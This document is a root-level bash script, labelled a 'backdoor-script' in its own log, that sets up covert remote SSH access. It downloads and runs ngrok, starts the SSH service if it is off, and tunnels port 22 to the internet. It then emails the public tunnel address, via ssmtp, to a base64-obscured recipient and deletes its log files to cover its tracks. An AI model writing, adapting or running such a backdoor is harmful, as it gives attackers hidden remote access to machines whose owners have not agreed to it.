#! /bin/bash 

dependencies(){
	cd /var/tmp
	printf "Subject: Log(s) for the backdoor-script\n\n">>success.log
	printf "$(date): the working directory is $(pwd)\n" >> success.log
	command -v /usr/bin/wget > /dev/null || { echo "$(date): (wget) is required to proceed"; exit 1;}
	command -v /usr/bin/unzip > /dev/null || { echo "$(date): (unzip) should be available to proceed"; exit 1;}
	test $(/usr/bin/id -u) -eq 0 || { printf "$(date): (root) should run the script\n"; exit 1; }
	command -v /usr/bin/jq || { printf "$(date): (jq) is required to proceed\n"; exit 1; }
	command -v /usr/bin/curl || { printf "$(date): (curl) is required to run\n"; exit 1;}
	command -v /usr/sbin/ssmtp > /dev/null || { echo "$(date): (ssmtp) is required to proceed"; exit 1; }
}


start(){
	if [[ -e ngrok ]]
	then
		printf ""
	else
		printf "$(date): downloading ngrok...(please Wait)\n" >> success.log
		/usr/bin/wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-386.zip > /dev/null 2>&1
		if [[ -s ngrok-stable-linux-386.zip ]]
		then
			printf "$(date): ngrok was downloaded..unzipping it (please Wait)...\n" >> success.log
			/usr/bin/unzip ngrok-stable-linux-386.zip > /dev/null 2>&1
			chmod +x ngrok
			rm -fr ngrok-stable-linux-386.zip > /dev/null 2>&1
		else
			printf "[error] $(date): there was an error downloading the file.\n" >> success.log
			exit 1
		fi
	fi

	printf "$(date): checking if ssh is active..\n" >> success.log
	command=$(/usr/bin/systemctl status ssh | grep Active | cut -d ":" -f 2)
	
	if [[ $command == *"inactive"* ]]
	then
		printf "$(date): ssh is inactive...starting ssh." >> success.log
		systemctl start ssh > /dev/null 2>&1
	else
		printf ""
	fi
	
	printf "$(date): starting ngrok server\n" >> success.log
	sleep 30
	./ngrok tcp 22 > /dev/null 2>&1 &
	sleep 90
	link=$(/usr/bin/curl -s http://localhost:4040/api/tunnels | jq -r .tunnels[0].public_url | cut -d "/" -f 3)

	echo "$(date): task done..connect to - ${link}" >> success.log
	
	/usr/sbin/ssmtp $(echo "ZW1haWxhZGRyZXNzCg==" | /usr/bin/base64 -d) < success.log
	# This ^^ is where the your email address goes to :)
	rm -fr success.log error.txt
}

dependencies
start
